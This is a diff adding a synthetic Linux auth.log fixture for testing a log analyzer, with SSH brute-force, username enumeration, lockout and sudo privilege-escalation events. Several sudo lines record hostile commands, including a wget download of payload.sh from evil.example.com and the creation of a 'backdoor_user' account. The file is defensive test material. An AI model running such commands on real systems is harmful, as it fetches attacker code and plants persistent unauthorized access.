@@ -1,0 +1,57 @@
+# Sample Linux auth.log — contains brute force, privilege escalation, and lockout events
+# This is a realistic synthetic log for testing the Log Analyzer
+
+Apr  3 08:00:01 webserver sshd[1001]: Failed password for root from 203.0.113.42 port 55234 ssh2
+Apr  3 08:00:05 webserver sshd[1002]: Failed password for root from 203.0.113.42 port 55235 ssh2
+Apr  3 08:00:09 webserver sshd[1003]: Failed password for root from 203.0.113.42 port 55236 ssh2
+Apr  3 08:00:13 webserver sshd[1004]: Failed password for root from 203.0.113.42 port 55237 ssh2
+Apr  3 08:00:17 webserver sshd[1005]: Failed password for root from 203.0.113.42 port 55238 ssh2
+Apr  3 08:00:21 webserver sshd[1006]: Failed password for root from 203.0.113.42 port 55239 ssh2
+Apr  3 08:00:25 webserver sshd[1007]: Failed password for root from 203.0.113.42 port 55240 ssh2
+Apr  3 08:00:29 webserver sshd[1008]: Failed password for root from 203.0.113.42 port 55241 ssh2
+Apr  3 08:00:33 webserver sshd[1009]: Failed password for root from 203.0.113.42 port 55242 ssh2
+Apr  3 08:00:37 webserver sshd[1010]: Failed password for root from 203.0.113.42 port 55243 ssh2
+
+Apr  3 08:01:00 webserver sshd[1011]: Failed password for invalid user admin from 198.51.100.77 port 43100 ssh2
+Apr  3 08:01:04 webserver sshd[1012]: Failed password for invalid user oracle from 198.51.100.77 port 43101 ssh2
+Apr  3 08:01:08 webserver sshd[1013]: Failed password for invalid user postgres from 198.51.100.77 port 43102 ssh2
+Apr  3 08:01:12 webserver sshd[1014]: Failed password for invalid user ubuntu from 198.51.100.77 port 43103 ssh2
+Apr  3 08:01:16 webserver sshd[1015]: Failed password for invalid user pi from 198.51.100.77 port 43104 ssh2
+Apr  3 08:01:20 webserver sshd[1016]: Failed password for invalid user test from 198.51.100.77 port 43105 ssh2
+
+Apr  3 08:02:00 webserver sshd[1020]: Invalid user deploy from 192.0.2.88
+Apr  3 08:02:04 webserver sshd[1021]: Failed password for jsmith from 192.0.2.88 port 55100 ssh2
+Apr  3 08:02:08 webserver sshd[1022]: Failed password for jsmith from 192.0.2.88 port 55101 ssh2
+Apr  3 08:02:12 webserver sshd[1023]: Failed password for jsmith from 192.0.2.88 port 55102 ssh2
+Apr  3 08:02:16 webserver sshd[1024]: Failed password for jsmith from 192.0.2.88 port 55103 ssh2
+Apr  3 08:02:20 webserver sshd[1025]: Failed password for jsmith from 192.0.2.88 port 55104 ssh2
+Apr  3 08:02:24 webserver sshd[1026]: Failed password for jsmith from 192.0.2.88 port 55105 ssh2
+
+Apr  3 08:05:00 webserver sshd[1030]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.0.2.88 user=jsmith
+Apr  3 08:05:01 webserver pam_tally2[1031]: user jsmith (uid=1001) tally 7, deny 5
+
+Apr  3 09:00:00 webserver sshd[2000]: Accepted password for jsmith from 10.0.1.50 port 22100 ssh2
+Apr  3 09:00:01 webserver sshd[2000]: pam_unix(sshd:session): session opened for user jsmith by (uid=0)
+
+Apr  3 09:05:00 webserver sudo: jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/apt-get update
+Apr  3 09:06:00 webserver sudo: jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/bash
+Apr  3 09:07:00 webserver sudo: jsmith : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://evil.example.com/payload.sh
+Apr  3 09:08:00 webserver sudo: jsmith : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/useradd -m -s /bin/bash backdoor_user
+Apr  3 09:09:00 webserver sudo: jsmith : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/visudo
+
+Apr  3 09:10:00 webserver su[2100]: Successful su for root by jsmith
+Apr  3 09:10:01 webserver su[2100]: pam_unix(su:session): session opened for user root by jsmith(uid=1001)
+
+Apr  3 09:15:00 webserver sshd[2200]: pam_unix(sshd:session): session opened for user root by (uid=0)
+
+Apr  3 10:00:00 webserver sshd[3001]: Failed password for mwilson from 172.16.0.200 port 60001 ssh2
+Apr  3 10:00:04 webserver sshd[3002]: Failed password for mwilson from 172.16.0.200 port 60002 ssh2
+Apr  3 10:00:08 webserver sshd[3003]: Failed password for mwilson from 172.16.0.200 port 60003 ssh2
+Apr  3 10:00:12 webserver sshd[3004]: Failed password for mwilson from 172.16.0.200 port 60004 ssh2
+Apr  3 10:00:16 webserver sshd[3005]: Failed password for mwilson from 172.16.0.200 port 60005 ssh2
+Apr  3 10:00:20 webserver sshd[3006]: Failed password for mwilson from 172.16.0.200 port 60006 ssh2
+Apr  3 10:00:24 webserver pam_tally2[3007]: user mwilson (uid=1002) tally 6, deny 5
+
+Apr  3 10:30:00 webserver sshd[4000]: Accepted password for mwilson from 10.0.1.50 port 22200 ssh2
+Apr  3 10:30:01 webserver sshd[4000]: pam_unix(sshd:session): session opened for user mwilson by (uid=0)
+Apr  3 10:31:00 webserver sudo: mwilson : authentication failure ; logname= uid=1002 euid=0 tty=pts/1 ruser= rhost= user=mwilson
